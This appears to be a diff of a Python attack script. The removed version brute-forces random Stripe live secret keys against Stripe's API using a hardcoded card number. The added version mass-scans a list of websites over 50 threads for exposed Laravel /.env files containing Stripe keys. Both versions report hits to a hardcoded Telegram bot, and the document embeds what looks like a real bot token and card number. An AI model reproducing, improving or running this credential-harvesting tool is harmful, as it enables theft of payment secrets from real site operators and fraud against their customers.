@@ -1,28 +1,81 @@
-import requests, random, string, time, os
+import os, requests, time
+from multiprocessing.dummy import Pool as ThreadPool
+from multiprocessing import Pool
+import threading
+import sys
+from colorama import Fore, Style
 
-token = os.environ.get("BOT_TOKEN")
-chatid = os.environ.get("FORWARD_ID")
+def screen_clear():
+    _ = os.system('cls')
 
-def long_key():
-  skkey = random.choice(['sk_live_51H', 'sk_live_51J'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
-  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
-  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
-    print(f"DEAD > {skkey}")
-  else:
-    print(f"LIVE > {skkey}")
-    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
-    
-def short_key():
-  skkey = "sk_live_"+''.join(random.choices( string.digits + string.ascii_letters, k = 24))
-  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
-  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
-    print(f"DEAD > {skkey}")
-  else:
-    print(f"LIVE > {skkey}")
-    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
-    
-while True:
-  long_key()
-  #time.sleep(0.5) #if your heroku account keeps getting banned
-  short_key()
-    
+
+bl = Fore.BLUE
+wh = Fore.WHITE
+gr = Fore.GREEN
+red = Fore.RED
+res = Style.RESET_ALL
+yl = Fore.YELLOW
+
+
+headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}
+bot_token = "1836057993:AAF4cP9qNx3gFh-epkgjBRYkALyzVs6W0gw"
+id = 1196575861
+def laravelcheck (star):
+    if "://" in star:
+      star = star
+    else:
+      star = "http://" + star
+    star = star.replace('\n', '').replace('\r', '')
+    url = star + "/.env"
+    check = requests.get(url, headers=headers, timeout=1)
+    resp = check.text
+    try:
+        if "STRIPE_KEY" in resp:
+        	requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={id}&text={star}/.env")
+          #  print(f"Laravel {gr}OK{res} => {star}\n") and r.post(f"{ss}) 
+   #         mrigel = open("Laravel.txt", "a")
+ #           mrigel.write(f'{star}\n')
+        elif "STRIPE_SECRET" in resp:
+        	requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={id}&text={star}/.env")
+        else:
+            print(f"{red}Not{res} Laravel => {star}\n")
+    except:
+        pass
+
+def filter(star):
+    try:
+       laravelcheck(star)
+    except:
+       pass
+
+
+def main():
+    print(f'''    
+{gr}
+░██████╗██╗░░██╗░█████╗░██████╗░██╗███████╗
+██╔════╝██║░░██║██╔══██╗██╔══██╗██║██╔════╝
+╚█████╗░███████║███████║██████╔╝██║█████╗░░
+░╚═══██╗██╔══██║██╔══██║██╔══██╗██║██╔══╝░░
+██████╔╝██║░░██║██║░░██║██║░░██║██║██║░░░░░
+╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░░░░
+
+  {red} Tool By   @Srfxdz  \n
+{yl}This Tool Is Totally Free If You Bought This You Got Scammed  
+
+
+
+
+    ''')
+    list = "list.txt"
+    star = open(list, 'r').readlines()
+    try:
+       ThreadPool = Pool(50)
+       ThreadPool.map(filter, star)
+       ThreadPool.close()
+       ThreadPool.join()
+    except:
+       pass
+       
+if __name__ == '__main__':
+    screen_clear()
+    main()
